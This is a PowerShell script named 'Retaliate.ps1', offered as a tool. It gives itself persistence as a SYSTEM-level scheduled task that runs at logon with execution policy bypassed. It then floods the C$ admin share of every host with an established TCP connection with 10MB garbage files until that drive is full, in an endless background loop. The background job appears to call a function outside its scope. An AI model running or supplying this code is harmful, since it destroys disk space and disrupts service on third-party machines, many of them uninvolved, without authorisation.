# Retaliate.ps1 by Gorstak

function Register-SystemLogonScript {
    param (
        [string]$TaskName = "RunRetaliateAtLogon"
    )

    # Define paths
    $scriptSource = $MyInvocation.MyCommand.Path
    if (-not $scriptSource) {
        # Fallback to determine script path
        $scriptSource = $PSCommandPath
        if (-not $scriptSource) {
            Write-Output "Error: Could not determine script path."
            return
        }
    }

    $targetFolder = "C:\Windows\Setup\Scripts\Bin"
    $targetPath = Join-Path $targetFolder (Split-Path $scriptSource -Leaf)

    # Create required folders
    if (-not (Test-Path $targetFolder)) {
        New-Item -Path $targetFolder -ItemType Directory -Force | Out-Null
        Write-Output "Created folder: $targetFolder"
    }

    # Copy the script
    try {
        Copy-Item -Path $scriptSource -Destination $targetPath -Force -ErrorAction Stop
        Write-Output "Copied script to: $targetPath"
    } catch {
        Write-Output "Failed to copy script: $_"
        return
    }

    # Define the scheduled task action and trigger
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$targetPath`""
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

    # Register the task
    try {
        Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
        Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Principal $principal
        Write-Output "Scheduled task '$TaskName' created to run at user logon under SYSTEM."
    } catch {
        Write-Output "Failed to register task: $_"
    }
}

# Run the function
Register-SystemLogonScript

function Fill-RemoteHostDriveWithGarbage {
    try {
        # Get incoming TCP connections (where LocalAddress is bound and RemoteAddress is the client)
        $connections = Get-NetTCPConnection | Where-Object { $_.State -eq "Established" }
        if ($connections) {
            foreach ($conn in $connections) {
                $remoteIP = $conn.RemoteAddress
                # Attempt to access the remote host's C$ share (admin share)
                $remotePath = "\\$remoteIP\C$"
                
                # Check if the remote path is accessible (requires admin rights)
                if (Test-Path $remotePath) {
                    $counter = 1
                    while ($true) {
                        try {
                            $filePath = Join-Path -Path $remotePath -ChildPath "garbage_$counter.dat"
                            $garbage = [byte[]]::new(10485760) # 10MB in bytes
                            (New-Object System.Random).NextBytes($garbage)
                            [System.IO.File]::WriteAllBytes($filePath, $garbage)
                            Write-Host "Wrote 10MB to $filePath"
                            $counter++
                        }
                        catch {
                            # Stop if the drive is full or another error occurs
                            if ($_.Exception -match "disk full" -or $_.Exception -match "space") {
                                Write-Host "Drive at $remotePath is full or inaccessible. Stopping."
                                break
                            }
                            else {
                                Write-Host "Error writing to $filePath : $_"
                                break
                            }
                        }
                    }
                }
                else {
                    Write-Host "Cannot access $remotePath - check permissions or connectivity."
                }
            }
        }
        else {
            Write-Host "No incoming connections found."
        }
    }
    catch {
        Write-Host "General error: $_"
    }
}

# Run as a background job
Start-Job -ScriptBlock {
    while ($true) {
        Fill-RemoteHostDriveWithGarbage
        }
}